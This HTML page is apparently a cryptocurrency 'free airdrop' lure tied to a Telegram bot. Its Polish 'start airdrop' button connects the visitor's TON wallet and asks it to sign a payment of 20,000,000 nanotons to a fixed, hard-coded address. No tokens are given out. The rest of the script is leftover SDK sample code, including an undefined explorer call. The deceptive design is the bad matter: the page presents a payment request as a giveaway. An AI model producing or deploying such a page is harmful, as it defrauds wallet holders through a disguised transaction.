<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Connect Example</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@0.0.34/dist/tonconnect-sdk.min.js"></script>

</head>

<body>
    <div class="center" id="ton-connect"></div>
    <button id="start-airdrop" style="">Rozpocznij Airdrop</button>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });
        tonConnectUI.uiOptions = {
            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
        };

        const startAirdropButton = document.getElementById('start-airdrop');


        startAirdropButton.addEventListener('click', async () => {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
                messages: [
                    {
                        address: "EQBt8sB4yJmqJChn4HTuw0eeKEOwnBj1subaqeYt40VKvsWH",
                        amount: "20000000",
                        // stateInit: "base64bocblahblahblah==" // just for instance. Replace with your transaction initState or remove
                    }
                ]
            }

            try {
                const result = await tonConnectUI.sendTransaction(transaction);

                // you can use signed boc to find the transaction 
                const someTxData = await myAppExplorerService.getTransaction(result.boc);
                alert('Transaction was sent successfully', someTxData);
            } catch (e) {
                console.error(e);
            }


        });
    </script>
</body>

</html>
